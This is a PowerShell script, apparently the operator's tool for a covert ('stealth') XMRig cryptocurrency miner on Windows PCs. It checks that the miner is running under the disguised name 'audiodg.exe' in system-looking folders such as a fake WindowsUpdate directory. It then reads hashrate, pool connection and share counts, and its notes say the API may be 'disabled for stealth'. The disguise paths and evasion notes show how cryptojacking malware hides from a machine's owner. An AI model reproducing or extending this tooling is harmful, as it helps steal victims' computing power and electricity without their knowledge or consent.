# ================================================================================================
# MINER STATUS CHECKER - Check if miner is working on local PC
# ================================================================================================
# Run this script to verify miner is running and mining successfully
# Safe to run - won't interfere with miner operation
# ================================================================================================

param(
    [switch]$Detailed,  # Show detailed statistics
    [switch]$Loop       # Keep checking every 10 seconds
)

Clear-Host

function Get-MinerStatus {
    Write-Host "+===========================================================+" -ForegroundColor Cyan
    Write-Host "|          STEALTH MINER STATUS CHECKER                     |" -ForegroundColor Cyan
    Write-Host "+===========================================================+" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "PC: $env:COMPUTERNAME" -ForegroundColor Yellow
    Write-Host "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    
    # ========== CHECK 1: PROCESS STATUS ==========
    Write-Host "`n[1] PROCESS STATUS:" -ForegroundColor Green
    
    $minerPaths = @(
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe",
        "C:\Windows\SystemApps\audiodg.exe",
        "C:\Windows\System32\spool\drivers\audiodg.exe"
    )
    
    $minerProcess = $null
    $minerPath = $null
    
    foreach ($path in $minerPaths) {
        if (Test-Path $path) {
            $minerPath = $path
            $minerProcess = Get-Process -Name "audiodg" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $path }
            if ($minerProcess) { break }
        }
    }
    
    if ($minerProcess) {
        Write-Host "   [OK] Status: RUNNING" -ForegroundColor Green
        Write-Host "   Path: $($minerProcess.Path)" -ForegroundColor Gray
        Write-Host "   PID: $($minerProcess.Id)" -ForegroundColor Gray
        Write-Host "   Uptime: $([math]::Round((New-TimeSpan -Start $minerProcess.StartTime).TotalHours, 2)) hours" -ForegroundColor Gray
        Write-Host "   CPU: $([math]::Round($minerProcess.CPU, 1))%" -ForegroundColor Gray
        Write-Host "   RAM: $([math]::Round($minerProcess.WorkingSet64 / 1MB, 1)) MB" -ForegroundColor Gray
        
        # Check if actually hashing
        if ($minerProcess.CPU -gt 10) {
            Write-Host "   [ACTIVE] Mining: ACTIVE (High CPU usage detected)" -ForegroundColor Green
        } else {
            Write-Host "   [WARN] Mining: POSSIBLY STUCK (Low CPU usage)" -ForegroundColor Yellow
        }
    } else {
        Write-Host "   [X] Status: NOT RUNNING" -ForegroundColor Red
        Write-Host "   [!] Miner process not found!" -ForegroundColor Red
        return $false
    }
    
    # ========== CHECK 2: XMRIG API STATUS ==========
    Write-Host "`n[2] XMRIG API STATUS:" -ForegroundColor Green
    
    try {
        $apiUrl = "http://127.0.0.1:16000/1/summary"
        $response = Invoke-RestMethod -Uri $apiUrl -Method Get -TimeoutSec 3 -ErrorAction Stop
        
        Write-Host "   [OK] API: ACCESSIBLE" -ForegroundColor Green
        
        if ($response) {
            # Hashrate
            $hashrate = $response.hashrate
            if ($hashrate) {
                $current = [math]::Round($hashrate.total[0], 2)
                $avg10s = [math]::Round($hashrate.total[1], 2)
                $avg60s = [math]::Round($hashrate.total[2], 2)
                
                Write-Host ""
                Write-Host "   =======================================" -ForegroundColor Cyan
                Write-Host "   HASHRATE:" -ForegroundColor Cyan
                Write-Host "   =======================================" -ForegroundColor Cyan
                Write-Host "      Current:  $current H/s" -ForegroundColor Yellow
                Write-Host "      10s avg:  $avg10s H/s" -ForegroundColor Yellow
                Write-Host "      60s avg:  $avg60s H/s" -ForegroundColor Yellow
                
                if ($current -gt 1000) {
                    Write-Host "      Status:   EXCELLENT" -ForegroundColor Green
                } elseif ($current -gt 500) {
                    Write-Host "      Status:   GOOD" -ForegroundColor Green
                } elseif ($current -gt 100) {
                    Write-Host "      Status:   FAIR" -ForegroundColor Yellow
                } else {
                    Write-Host "      Status:   LOW" -ForegroundColor Red
                }
            }
            
            # Pool connection
            if ($response.connection) {
                Write-Host ""
                Write-Host "   POOL CONNECTION:" -ForegroundColor Cyan
                Write-Host "      Pool:     $($response.connection.pool)" -ForegroundColor Gray
                Write-Host "      Uptime:   $([math]::Round($response.connection.uptime / 3600, 2)) hours" -ForegroundColor Gray
                Write-Host "      Ping:     $($response.connection.ping) ms" -ForegroundColor Gray
                
                if ($response.connection.ping -lt 100) {
                    Write-Host "      Latency:  EXCELLENT" -ForegroundColor Green
                } elseif ($response.connection.ping -lt 200) {
                    Write-Host "      Latency:  GOOD" -ForegroundColor Yellow
                } else {
                    Write-Host "      Latency:  HIGH" -ForegroundColor Red
                }
            }
            
            # Results (shares accepted/rejected)
            if ($response.results) {
                Write-Host ""
                Write-Host "   SHARES:" -ForegroundColor Cyan
                Write-Host "      Accepted: $($response.results.shares_good)" -ForegroundColor Green
                Write-Host "      Rejected: $($response.results.shares_total - $response.results.shares_good)" -ForegroundColor Red
                
                if ($response.results.shares_total -gt 0) {
                    $acceptRate = [math]::Round(($response.results.shares_good / $response.results.shares_total) * 100, 2)
                    Write-Host "      Rate:     $acceptRate%" -ForegroundColor $(if ($acceptRate -gt 95) { "Green" } else { "Yellow" })
                }
            }
            
            # Huge pages
            if ($response.hugepages) {
                Write-Host ""
                Write-Host "   HUGE PAGES:" -ForegroundColor Cyan
                $hugePercent = [math]::Round(($response.hugepages[0] / $response.hugepages[1]) * 100, 1)
                Write-Host "      Enabled:  $($response.hugepages[0]) / $($response.hugepages[1]) ($hugePercent%)" -ForegroundColor $(if ($hugePercent -gt 50) { "Green" } else { "Yellow" })
                
                if ($hugePercent -lt 50) {
                    Write-Host "      [WARN] Huge pages not fully enabled (hashrate may be 20% lower)" -ForegroundColor Yellow
                }
            }
            
            # CPU info
            if ($Detailed -and $response.cpu) {
                Write-Host ""
                Write-Host "   CPU INFO:" -ForegroundColor Cyan
                Write-Host "      Brand:    $($response.cpu.brand)" -ForegroundColor Gray
                Write-Host "      Cores:    $($response.cpu.cores)" -ForegroundColor Gray
                Write-Host "      Threads:  $($response.cpu.threads)" -ForegroundColor Gray
                Write-Host "      AES:      $($response.cpu.aes)" -ForegroundColor Gray
                Write-Host "      AVX2:     $($response.cpu.avx2)" -ForegroundColor Gray
            }
            
            Write-Host "   =======================================" -ForegroundColor Cyan
        }
        
    } catch {
        Write-Host "   [WARN] API: NOT ACCESSIBLE" -ForegroundColor Yellow
        Write-Host "   [NOTE] This is normal if API is disabled for stealth" -ForegroundColor Gray
        Write-Host "   [NOTE] Miner can still be working (check process status above)" -ForegroundColor Gray
    }
    
    # ========== CHECK 3: NETWORK CONNECTION ==========
    Write-Host "`n[3] NETWORK CONNECTION:" -ForegroundColor Green
    
    try {
        $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | 
            Where-Object { $_.OwningProcess -eq $minerProcess.Id }
        
        if ($connections) {
            Write-Host "   [OK] Pool Connection: ACTIVE" -ForegroundColor Green
            foreach ($conn in $connections | Select-Object -First 3) {
                Write-Host "   -> $($conn.RemoteAddress):$($conn.RemotePort)" -ForegroundColor Gray
            }
        } else {
            Write-Host "   [WARN] Pool Connection: NOT DETECTED" -ForegroundColor Yellow
            Write-Host "   [NOTE] May be using TLS or connection just starting" -ForegroundColor Gray
        }
    } catch {
        Write-Host "   [WARN] Unable to check network connections" -ForegroundColor Yellow
    }
    
    # ========== CHECK 4: FILES STATUS ==========
    if ($Detailed) {
        Write-Host "`n[4] FILES STATUS:" -ForegroundColor Green
        
        $files = @(
            @{ Path = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"; Name = "Miner" },
            @{ Path = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"; Name = "Config" }
        )
        
        foreach ($file in $files) {
            if (Test-Path $file.Path) {
                $size = [math]::Round((Get-Item $file.Path).Length / 1MB, 2)
                Write-Host "   [OK] $($file.Name): EXISTS (${size} MB)" -ForegroundColor Green
            } else {
                Write-Host "   [X] $($file.Name): MISSING" -ForegroundColor Red
            }
        }
    }
    
    Write-Host ""
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    
    # Overall status
    if ($minerProcess -and $minerProcess.CPU -gt 10) {
        Write-Host "[SUCCESS] OVERALL STATUS: MINING SUCCESSFULLY!" -ForegroundColor Green
        return $true
    } elseif ($minerProcess) {
        Write-Host "[WARN] OVERALL STATUS: MINER RUNNING BUT POSSIBLY STUCK" -ForegroundColor Yellow
        return $true
    } else {
        Write-Host "[ERROR] OVERALL STATUS: MINER NOT RUNNING" -ForegroundColor Red
        return $false
    }
}

# ================================================================================================
# MAIN EXECUTION
# ================================================================================================

if ($Loop) {
    Write-Host "[LOOP] Continuous monitoring mode (Press Ctrl+C to stop)..." -ForegroundColor Cyan
    Write-Host ""
    
    while ($true) {
        Get-MinerStatus
        Write-Host ""
        Write-Host "[WAIT] Next check in 10 seconds..." -ForegroundColor DarkGray
        Start-Sleep -Seconds 10
        Clear-Host
    }
} else {
    Get-MinerStatus
    Write-Host ""
    Write-Host "[TIP] Run with -Loop for continuous monitoring" -ForegroundColor Cyan
    Write-Host "[TIP] Run with -Detailed for more information" -ForegroundColor Cyan
    Write-Host ""
}
